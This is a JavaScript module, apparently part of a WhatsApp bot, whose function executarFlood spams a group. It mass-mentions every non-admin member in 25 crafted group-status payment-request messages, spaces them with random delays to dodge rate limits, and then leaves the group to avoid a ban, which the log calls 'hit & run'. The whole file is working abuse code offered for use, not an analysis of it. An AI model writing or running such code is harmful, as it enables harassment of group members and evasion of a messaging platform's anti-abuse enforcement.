const fs = require('fs');

async function executarFlood(sock, groupId) {
    try {
        const gMeta = await sock.groupMetadata(groupId);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
        const participantes = gMeta.participants
            .map(u => u.id)
            .filter(id => id !== botId && !admins.includes(id));

        const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
        let statusText = fullText;
        
        // Remove tudo entre as barras de fantasma (incluindo elas) para o status
        const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
        if (statusText.includes(separadorFantasma)) {
            const parts = statusText.split(separadorFantasma);
            if (parts.length >= 3) {
                statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
            }
        }
        
        // Limpa marcações de código (```) do ascii que possam ter sobrado e excesso de quebras de linha
        statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();

        const count = 25;
        for (let i = 0; i < count; i++) {
            try {
                // Envia Status
                await sock.relayMessage(groupId, {
                    groupStatusMessageV2: {
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "",
                                amount1000: "0",
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: statusText,
                                        contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                    }
                                },
                                expiryTimestamp: "0",
                                amount: { value: "0", offset: 1000, currencyCode: "" }
                            }
                        }
                    }
                }, {});

                const delayAleatorio = Math.floor(Math.random() * (2500 - 1000 + 1)) + 1000;
                await new Promise(r => setTimeout(r, delayAleatorio));
            } catch (err) {
                if (err.message.includes('rate-overlimit')) {
                    await new Promise(r => setTimeout(r, 2000));
                } else {
                    console.error("Erro ao enviar mensagens de flood:", err.message);
                }
            }
        }

        // AUTO-LEAVE: Sai do grupo após terminar o flood
        console.log(`\x1b[33m[HIT & RUN]\x1b[0m Flood finalizado. Saindo do grupo...`);
        try {
            await sock.groupLeave(groupId);
            console.log(`\x1b[32m[SAIU]\x1b[0m Saiu do grupo com sucesso para evitar ban.`);
        } catch (leaveErr) {
            console.error(`\x1b[31m[ERRO]\x1b[0m Falha ao sair do grupo:`, leaveErr.message);
        }

    } catch (err) {
        console.error("Erro ao executar flood automático:", err.message);
    }
}

module.exports = { executarFlood };
